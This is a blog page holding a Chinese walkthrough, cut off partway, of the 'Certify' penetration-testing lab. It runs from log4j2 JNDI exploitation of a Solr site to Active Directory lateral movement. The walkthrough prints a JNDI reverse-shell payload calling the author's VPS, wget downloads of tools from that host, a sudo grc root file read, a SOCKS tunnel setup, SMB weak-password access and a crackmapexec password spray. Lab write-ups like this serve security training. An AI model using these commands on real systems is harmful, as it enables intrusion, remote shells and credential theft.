@@ -1,0 +1,1382 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 春秋云镜 Certify 外网 log4j2拿shell fscan.exe扫出一个solr站点\n访问发现log4j组件\ndns外带测试一下可以发现确实存在漏洞\n1 ${jndi:ldap://xhf0n2.dnslog.cn} ">
+<title>Certify</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/certify/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="Certify">
+<meta property='og:description' content=" 春秋云镜 Certify 外网 log4j2拿shell fscan.exe扫出一个solr站点\n访问发现log4j组件\ndns外带测试一下可以发现确实存在漏洞\n1 ${jndi:ldap://xhf0n2.dnslog.cn} ">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/certify/'>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2026-01-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-10T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Certify">
+<meta name="twitter:description" content=" 春秋云镜 Certify 外网 log4j2拿shell fscan.exe扫出一个solr站点\n访问发现log4j组件\ndns外带测试一下可以发现确实存在漏洞\n1 ${jndi:ldap://xhf0n2.dnslog.cn} ">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#外网">外网</a>
+      <ol>
+        <li><a href="#log4j2拿shell">log4j2拿shell</a></li>
+        <li><a href="#grc提权flag1">grc提权(flag1)</a></li>
+      </ol>
+    </li>
+    <li><a href="#内网">内网</a>
+      <ol>
+        <li><a href="#smbflag2">smb(flag2)</a></li>
+        <li><a href="#密码喷洒">密码喷洒</a></li>
+        <li><a href="#spn">spn</a></li>
+        <li><a href="#adcs-esc1-证书服务提权flag3-4">ADCS ESC1-证书服务提权（flag3-4）</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #00ff00; color: #fff;">
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/certify/">Certify</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-10</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="春秋云镜-certify"><strong>春秋云镜 Certify</strong>
+</h1><h2 id="外网">外网
+</h2><h3 id="log4j2拿shell">log4j2拿shell
+</h3><p>fscan.exe扫出一个solr站点</p>
+<p><img src="/p/certify/image-20260110135646756.png"
+	width="1410"
+	height="429"
+	srcset="/p/certify/image-20260110135646756_hu_512ab09740c1c7e6.png 480w, /p/certify/image-20260110135646756_hu_6a6121269b630f18.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110135646756"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="788px"
+	
+></p>
+<p>访问发现log4j组件</p>
+<p><img src="/p/certify/image-20260110135743411.png"
+	width="1678"
+	height="555"
+	srcset="/p/certify/image-20260110135743411_hu_2d9389a8e906cf53.png 480w, /p/certify/image-20260110135743411_hu_9cd3a2816b777f9.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110135743411"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p>dns外带测试一下可以发现确实存在漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${jndi:ldap://xhf0n2.dnslog.cn}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110140131836.png"
+	width="1457"
+	height="338"
+	srcset="/p/certify/image-20260110140131836_hu_78b60c8ced9c24bf.png 480w, /p/certify/image-20260110140131836_hu_a7bcad553da1f145.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110140131836"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="431"
+		data-flex-basis="1034px"
+	
+></p>
+<p>利用工具 <a class="link" href="https://github.com/0x727/JNDIExploit/"  target="_blank" rel="noopener"
+    >https://github.com/0x727/JNDIExploit/</a>，反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 101.200.39.193（vps_ip）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>触发反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${jndi:ldap://101.200.39.193:1389/Basic/ReverseShell/101.200.39.193/5000}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就有shell了（注意vps安全组打开1389，3456s）</p>
+<p><img src="/p/certify/image-20260110141431232.png"
+	width="1411"
+	height="450"
+	srcset="/p/certify/image-20260110141431232_hu_54b60995af9e43de.png 480w, /p/certify/image-20260110141431232_hu_22cc2dea869fc709.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110141431232"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="313"
+		data-flex-basis="752px"
+	
+></p>
+<h3 id="grc提权flag1">grc提权(flag1)
+</h3><p>但是权限太低，要提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110141727868.png"
+	width="984"
+	height="163"
+	srcset="/p/certify/image-20260110141727868_hu_5d8db87f23340696.png 480w, /p/certify/image-20260110141727868_hu_1c99ab7d7cab1838.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110141727868"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="603"
+		data-flex-basis="1448px"
+	
+></p>
+<p>有一个<code>grc</code>提权，<a class="link" href="https://gtfobins.github.io/gtfobins/grc/"  target="_blank" rel="noopener"
+    >grc | GTFOBins</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo grc --pty cat /root/flag/flag01.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110141843141.png"
+	width="799"
+	height="291"
+	srcset="/p/certify/image-20260110141843141_hu_314e36e4b805ee09.png 480w, /p/certify/image-20260110141843141_hu_adbebd1935e8e6cb.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110141843141"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="274"
+		data-flex-basis="658px"
+	
+></p>
+<h2 id="内网">内网
+</h2><p>vps开启一个http服务, 用来使靶机下载fscan, stowaway等</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 -m http.server 8080
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110142249305.png"
+	width="1476"
+	height="462"
+	srcset="/p/certify/image-20260110142249305_hu_804c3634a782c519.png 480w, /p/certify/image-20260110142249305_hu_92ec6043a76e476b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110142249305"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="319"
+		data-flex-basis="766px"
+	
+></p>
+<p>靶机下载工具（记得切换到tmp下载，当前目录无写入权限）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /tmp
+</span></span><span class="line"><span class="cl">wget http://101.200.39.193:8080/fscan
+</span></span><span class="line"><span class="cl">wget http://101.200.39.193:8080/linux_x64_agent
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">然后赋予权限
+</span></span><span class="line"><span class="cl">chmod 777 ./fscan
+</span></span><span class="line"><span class="cl">chmod 777 ./linux_x64_agent
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110143012555.png"
+	width="875"
+	height="263"
+	srcset="/p/certify/image-20260110143012555_hu_acf06ae849ee295b.png 480w, /p/certify/image-20260110143012555_hu_7de2c152ddaf0ff2.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110143012555"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="332"
+		data-flex-basis="798px"
+	
+></p>
+<p>fscan扫描内网</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./fscan -h 172.22.9.19/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110150107109.png"
+	width="1208"
+	height="498"
+	srcset="/p/certify/image-20260110150107109_hu_23be18b3fa6f28ba.png 480w, /p/certify/image-20260110150107109_hu_41232e96e2c993a4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110150107109"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="582px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.22.9.19		当前受控主机
+</span></span><span class="line"><span class="cl">172.22.9.7		DC:XIAORANG\XIAORANG-DC
+</span></span><span class="line"><span class="cl">172.22.9.47		fileserver, smb弱口令
+</span></span><span class="line"><span class="cl">172.22.9.26		DESKTOP-CBKTVMO.xiaorang.lab
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>172.22.9.47</code>这台主机存在smb弱口令, 连一下查看文件，需要先搭建代理才能连接到内网,使用stowaway搭建代理</p>
+<p>服务端(vps)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 12345 -s 123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>客户端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_agent -c 101.200.39.193:12345 -s 123456 --reconnect 8	
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后vps打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use 0
+</span></span><span class="line"><span class="cl">socks 5555 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="smbflag2">smb(flag2)
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 smbclient //172.22.9.47/fileshare -U administrator
+</span></span><span class="line"><span class="cl">随后输入密码123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接上去, 在secret里面可以找到flag, 还有一个personnel.db数据库文件, 把他们都下载下来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">get personnel.db
+</span></span><span class="line"><span class="cl">cd secret
+</span></span><span class="line"><span class="cl">get flag02.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110151828999.png"
+	width="642"
+	height="277"
+	srcset="/p/certify/image-20260110151828999_hu_519297c597956047.png 480w, /p/certify/image-20260110151828999_hu_1bd53d8dcf24cff4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110151828999"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="556px"
+	
+></p>
+<h3 id="密码喷洒">密码喷洒
+</h3><p>查看数据库类型</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file personnel.db
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110152149590.png"
+	width="1518"
+	height="88"
+	srcset="/p/certify/image-20260110152149590_hu_bb681421cd995ab.png 480w, /p/certify/image-20260110152149590_hu_fd99c2da9a264804.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110152149590"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1725"
+		data-flex-basis="4140px"
+	
+></p>
+<p><a class="link" href="https://blog.csdn.net/2401_88055648/article/details/152448020"  target="_blank" rel="noopener"
+    >没想到！一直要开会员的Navicat 终于有免费版了_navicat免费版-CSDN博客</a></p>
+<p>使用<code>navicat</code> 连接下载的数据库文件进行查看</p>
+<img src="image-20260110154112800.png" alt="image-20260110154112800" style="zoom:50%;" />
+<p>可以在数据库里面看到几个密码但是不知道用户名，其他的表又存在大量的用户名信息，把密码先搞下来</p>
+<p><img src="/p/certify/image-20260110154206254.png"
+	width="871"
+	height="249"
+	srcset="/p/certify/image-20260110154206254_hu_d164a50a2d2569c7.png 480w, /p/certify/image-20260110154206254_hu_db8357fe02762782.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110154206254"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="349"
+		data-flex-basis="839px"
+	
+></p>
+<p><img src="/p/certify/image-20260110154405038.png"
+	width="923"
+	height="296"
+	srcset="/p/certify/image-20260110154405038_hu_4f1e09bc8b753831.png 480w, /p/certify/image-20260110154405038_hu_c9e37029decb384d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110154405038"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="748px"
+	
+></p>
+<p>选中<code>name</code>这列复制下来, 结合前面的密码进行爆破</p>
+<p>(剩下两台主机, 而<code>172.22.9.7</code>是域控, 所以尝试对<code>172.22.9.26</code>这台主机进行密码喷洒攻击)，使用<code>crackmapexec</code> 工具通过 SMB 模块进行用户名和密码的爆破 (开启了445端口)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.9.26 -u user.txt -p pass.txt --continue-on-success
+</span></span><span class="line"><span class="cl">#--continue-on-success : 指 crackmapexec 在成功找到有效凭据后继续测试其他凭据组合
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110160303770.png"
+	width="776"
+	height="68"
